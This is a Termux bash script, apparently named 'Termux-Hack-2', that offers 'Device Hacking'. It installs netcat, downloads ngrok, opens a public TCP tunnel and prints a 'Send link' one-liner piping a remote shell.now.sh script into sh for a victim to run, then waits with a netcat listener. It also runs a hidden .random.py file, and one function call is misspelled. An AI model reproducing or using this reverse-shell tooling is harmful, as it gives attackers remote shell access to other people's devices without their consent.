R () {
	cd $PREFIX/bin
	if [ -e python ];then
	cd ~/Termux-Hack-2
	#cd /sdcard/Internal*/Git*
	echo -e "\033[0m"
	python .random.py
	fi
	}

ng2 () {
	cd ~
	if [ -e ngrok ];then
	cp -f ngrok ~/Termux-Hack-2
	fi
	}
	Downloading-ngrok () {
			cd ~/Termux-Hack-2
			if [ -e ngrok ];then
			chmod 700 ngrok
			R
			printf "\n[√] Ngrok Available\n"
			else
			clear
			cd ~/Termux-Hack-2
			sleep 2
			printf "\n\n\033[91m [×] Ngrok not found !!!\n\n"
			printf "\033[92m [+] Downloading ngrok....\n"
			wget https://github.com/rooted-cyber/upload/raw/master/ngrok.zip
			R
			printf "\n[√] Download complete\n"
			R
			printf "\n[+] Unzip ngrok.zip\n"
			unzip ngrok.zip
			chmod 700 ngrok
			rm -f ngrok.zip
			fi
			}
			checking () {
				cd ~/Termux-Hack-2
				if [ -e ngrok ];then
				R
				printf "\nSuccessfully download ngrok\n"
				sleep 2
				else
				Downloading-ngrok
				fi
				}

setup () {
	R
	printf "\n\n Requirement installing...\n"
	apt update
	apt upgrade
	apt install toilet
	apt install netcat
	apt install toilet
	apt install wget
	printf "\n\033[93m Checking ngrok in home..\n"
	ng2
	downloading-ngrok
	checking
	echo "#!/data/data/com.termux/files/usr/bin/sh" >> $PREFIX/bin/TH
	echo "bash ~/Termux-Hack-2/hacked.sh" >> $PREFIX/bin/TH
	chmod 777 $PREFIX/bin/TH
	R
	printf "Now you can use this command :- TH\n"
	}
	
	starting() {
	cd $PREFIX/bin
	if [ -e TH ];then
	echo
	else
	setup
	fi
	}
	
	ban() {
	toilet -f mono12 -F metal Hacked
	echo
	}
	ll () {
		R
		printf "\n[+] starting ngrok server\n"
		killall -2 ngrok > /dev/null 2>&1
		cd ~/Termux-Hack-2 > /dev/null 2>&1
		cd ~
		./ngrok tcp 3333 > /dev/null 2>&1 &
		sleep 13
		link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "0.tcp.ngrok.io:*[0-9][0-9][0-9][0-9][0-9]")
		R
		printf "\n\n Send link\n\n\033[0m"
		printf "curl https://shell.now.sh/$link | sh\n\n"
		R
		echo -e -n "Enter netcat port :-  "
		read b
		if [ ! -z $b ];then
		nc -l $b
		fi
		}
	menu() {
		
		ban
	R
	echo -e -n "Do you want to start Device Hacking \033[0m(\033[0mY\033[92m/\033[0mN) "
	read a
	case $a in
	y|Y)ll ;;
	n|N)exit ;;
	*)TH ;;
	esac
	}
	starting
	menu